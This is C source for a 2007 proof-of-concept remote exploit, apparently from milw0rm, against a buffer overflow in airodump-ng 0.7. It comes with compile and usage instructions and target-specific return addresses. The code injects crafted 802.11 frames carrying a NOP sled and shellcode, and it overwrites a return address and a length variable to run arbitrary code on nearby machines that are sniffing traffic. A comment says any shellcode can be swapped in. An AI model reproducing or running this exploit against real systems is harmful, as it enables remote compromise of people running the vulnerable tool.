/**
 * airodump-exp.c - aircrack/airodump-ng (0.7) remote exploit
 *
 * Proof of concept exploit for a stack (and heap) based
 * overflow in airodump-ng.  The vulnerability can be exploited
 * by transmitting some specially crafted 802.11 packets to
 * execute arbitrary code on any machines within range
 * that are sniffing with a vulnerable version of airodump-ng.
 *
 * This exploit requires the lorcon 802.11 packet injection
 * library, see http://802.11ninja.net for details.
 *
 * Compiling:
 *
 *   gcc -o airodump-remote airodump-remote.c -lorcon
 *
 * Usage:
 *
 *   ./airodump-ng <interface> <driver> <channel> <headertype> [return addr]
 *
 * Drivers supported by lorcon:
 *
 *   wlan-ng, hostap, airjack, prism54, madwifing, madwifiold,
 *   rtl8180, rt2570, rt2500, rt73, rt61, zd1211rw
 *
 * Header types:
 *
 *   0 - None (not tested)
 *   1 - Fake prism54 header
 *   2 - Fake radiotap header (not tested)
 *
 * Return addresses:
 *
 *   Backtrack Linux 2 (2.6.20) aircrack-ng 0.7 - 0x8054934
 *   Gentoo Linux (2.6.16) aircrack-ng 0.7 - 0x8055934
 *
 * Example usage:
 *
 *   ./airodump-ng wlan0 prism54 11 1 0x8054934
 *
 * Original advisory: http://www.nop-art.net/advisories/airodump-ng.txt
 * Author: Jonathan So [ jonny [ @ ] nop-art.net ]
 *
 * Copyright (C) 2007 Jonathan So
 */

#include <stdio.h>
#include <stdlib.h>
#include <tx80211.h>

// Linux x86 sys_write shellcode.  Any arbitrary shellcode should work
// here, it doesn't matter if it contains nulls.  Maximum 792 bytes.

char shellcode[] = "\xeb\x14"                      // jmp get_message

                                                 // start:
                 "\x59\x31\xdb\x31\xd2\xb2"
                 "\x1b"                          // message length
                 "\x31\xc0\x88\x04\x11"
                 "\xb0\x04\xcd\x80"              // sys_write
                 "\xb0\x01\xcd\x80"              // sys_exit

                                                 // get_message:
                 "\xe8\xe7\xff\xff\xff"          // call start
                 "Stop sniffing our network!!";  // message text

int main(int argc, char **argv)
{
  tx80211_t tx;
  tx80211_packet_t txp;
  uint8_t packet[1044];
  uint8_t *ppacket;

  int headertype;
  unsigned ret_addr = 0x8054934;
  FILE *fp;

  if(argc<5) {
      printf("usage: %s <interface> <driver> <channel> <arptype>
[ret_addr]\n", argv[0]);
      exit(1);
  }

  if(argc>5) {
      ret_addr = strtoul(argv[5], NULL, 16);
  }

  headertype = atoi(argv[4]);

  if ( tx80211_init(&tx, argv[1], tx80211_resolvecard(argv[2])) !=
TX80211_ENOERR) {
      fprintf(stderr, "Error initializing driver");
      return 1;
  }

  if (tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON) !=
TX80211_ENOERR) {
      fprintf(stderr, "Error setting inject mode\n");
      return 1;
  }

  if (tx80211_setchannel(&tx, atoi(argv[3])) < 0) {
              fprintf(stderr, "Error setting channel\n");
  }

  if (tx80211_open(&tx) < 0) {
      fprintf(stderr, "Unable to open interface\n");
      return 1;
  }

  txp.packet = packet;

  // Fill packet with nops
  memset(packet, 0x90, sizeof(packet));

  switch (headertype) {
      case 0:
          // No arptype, just send raw packet
          ppacket = packet;
          break;
      case 1:
          // Send fake prism header
          memcpy(packet+4, "\x08\x00\x00\x00", 4);
          ppacket = packet + 8;
          break;
      case 2:
          // Send fake radiotap header
          packet[0] = 0;
          packet[2] = 3;
          ppacket = packet + 3;
          break;
      default:
          printf("Invalid header type. Valid options are:\n");
          printf("  0 - none\n");
          printf("  1 - prism54\n");
          printf("  2 - radiotap\n");
          return 1;
  }

  // set some necessary 802.11 header fields
  ppacket[0] = 0xB0;
  ppacket[1] = 0;
  ppacket[24] = 1;
  ppacket[25] = 0;
  ppacket[26] = 2;
  ppacket[27] = 0;

  txp.plen = 512 + (ppacket - packet);
  if (tx80211_txpacket(&tx, &txp) < txp.plen) {
      fprintf(stderr, "Error sending packet 1\n");
      return 1;
  }

  ppacket[26] = 4;

  if (tx80211_txpacket(&tx, &txp) < txp.plen) {
      fprintf(stderr, "Error sending packet 2\n");
      return 1;
  }

  // Insert shellcode at end of nopsled
  memcpy(ppacket+(820-sizeof(shellcode)), shellcode, sizeof(shellcode));

  // Overwrite some char*, needs to be a valid address
  memcpy(ppacket+1028, &ret_addr, 4);

  // Overwrite global variable sk_len, used as argument to memcpy
  memcpy(ppacket+1032, "\x20\x05\x00\x00", 4);

  // Return address
  memcpy(ppacket+820, &ret_addr, 4);

  ppacket[1] = 0x40;
  txp.plen = 1036 +  + (ppacket - packet);

  if (tx80211_txpacket(&tx, &txp) < txp.plen) {
      fprintf(stderr, "Error sending packet 3\n");
      return 1;
  }

  tx80211_close(&tx);

  return 0;
}

// milw0rm.com [2007-04-12]
